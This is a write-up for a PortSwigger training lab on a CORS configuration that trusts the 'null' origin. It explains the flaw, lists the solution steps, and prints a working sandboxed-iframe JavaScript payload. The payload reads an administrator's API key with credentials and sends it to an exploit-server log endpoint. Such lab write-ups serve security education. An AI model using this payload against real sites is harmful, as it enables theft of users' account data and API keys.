# Lab: CORS vulnerability with trusted null origin (Apprentice)

**Lab:** [https://portswigger.net/web-security/cors/lab-null-origin-whitelisted-attack](https://portswigger.net/web-security/cors/lab-null-origin-whitelisted-attack)

**Task (from PortSwigger):**
This website has an insecure CORS configuration in that it trusts the "null" origin.

To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's
API key and upload the code to your exploit server. The lab is solved when you
successfully submit the administrator's API key.

Credentials: `wiener:peter`

## Vulnerability
The server does not reflect arbitrary origins, but it does trust the literal value
`Origin: null` and still returns `Access-Control-Allow-Credentials: true`. A sandboxed
iframe (`sandbox="allow-scripts ..."`) sends its requests with `Origin: null`, so code
running inside it can read the credentialed `/accountDetails` response.

## Solution
1. Log in as `wiener:peter`; confirm `GET /accountDetails` returns your API key.
2. In Burp, confirm that sending `Origin: null` yields
   `Access-Control-Allow-Origin: null` + `Access-Control-Allow-Credentials: true`.
3. Host the iframe payload below on the exploit server **Body**, replacing
   `YOUR-LAB-ID` and `YOUR-EXPLOIT-SERVER-ID`. The `srcdoc` iframe runs with a null origin.
4. **Store** -> **Deliver exploit to victim**.
5. Read **Access log**; the admin's API key arrives in the `GET /log?key=...` line.
6. **Submit solution** with the administrator's API key.

## Final Exploit Payload
```html
<iframe style="display:none" sandbox="allow-scripts" srcdoc="
<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='+encodeURIComponent(this.responseText);
    };
</script>"></iframe>
```

> Note: the iframe navigates the top window to the exploit server's `/log` endpoint so the
> request shows up in the Access log. If `allow-top-navigation` is needed for your lab,
> add it to the `sandbox` attribute: `sandbox="allow-scripts allow-top-navigation"`.
